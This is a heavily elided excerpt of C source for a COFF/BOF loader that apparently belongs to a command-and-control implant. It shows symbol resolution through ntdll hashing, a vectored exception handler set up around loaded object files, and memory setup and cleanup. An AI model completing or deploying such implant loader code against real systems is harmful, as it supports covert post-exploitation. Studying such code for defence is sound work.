...
BOOL CoffeeProcessSymbol( PCOFFEE Coffee, LPSTR SymbolName, UINT16 SymbolType, PVOID* pFuncAddr )
{
    ...
    *pFuncAddr = NULL;
    ...
    else if ( SymbolIsImport( SymbolName ) )
    {
         ...
         */
        if ( hLibrary == ((INSTANCE *)Instance)->Modules.Ntdll )
        {
            for ( DWORD i = 0 ;; i++ )
            {
                if ( ! NtApi[ i ].NameHash )
        ...
        if ( NT_SUCCESS( ((INSTANCE *)Instance)->Win32.LdrGetProcedureAddress( hLibrary, &AnsiString, 0, pFuncAddr ) ) )
            return TRUE;
...
BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE_T Size, UINT32 RequestID )
{
    ...
    if ( ((INSTANCE *)Instance)->Config.Implant.CoffeeVeh )
    {
        PUTS( "Register VEH handler..." )
        // Add Veh Debugger in case that our BOF crashes etc.
        VehHandle = ((INSTANCE *)Instance)->Win32.RtlAddVectoredExceptionHandler( 1, &VehDebugger );
        if ( ! VehHandle )
        {
            PACKAGE_ERROR_WIN32
            return FALSE;
    ...
    if ( VehHandle ) {
        ((INSTANCE *)Instance)->Win32.RtlRemoveVectoredExceptionHandler( VehHandle );
    }
...
VOID CoffeeCleanup( PCOFFEE Coffee )
{
    ...
    if ( Coffee->SecMap )
    {
        ...
        ((INSTANCE *)Instance)->Win32.LocalFree( Coffee->SecMap );
        Coffee->SecMap = NULL;
    }
}
...
VOID RemoveCoffeeFromInstance( PCOFFEE Coffee )
{
    ...
    {
        ((INSTANCE *)Instance)->Coffees = Entry->Next;
        return;
    }
...
VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize, UINT32 RequestID )
{
    ...
    Coffee            = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, sizeof( COFFEE ) );
    ...
    Coffee->Next      = ((INSTANCE *)Instance)->Coffees;
    ((INSTANCE *)Instance)->Coffees  = Coffee;
    ...
    Coffee->SecMap     = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, Coffee->Header->NumberOfSections * sizeof( SECTION_MAP ) );
...
END:
    ...
    if ( Coffee )
    {
        ...
        ((INSTANCE *)Instance)->Win32.LocalFree( Coffee );
        Coffee = NULL;
    }
}
...
VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_T CoffeeDataSize, PVOID ArgData, SIZE_T ArgSize, UINT32 RequestID )
{
    ...
    // Allocate memory
    CoffeeParams                 = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, sizeof( COFFEE_PARAMS ) );
    CoffeeParams->EntryName      = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, EntryNameSize );
    CoffeeParams->CoffeeData     = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, CoffeeDataSize );
    CoffeeParams->ArgData        = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, ArgSize );
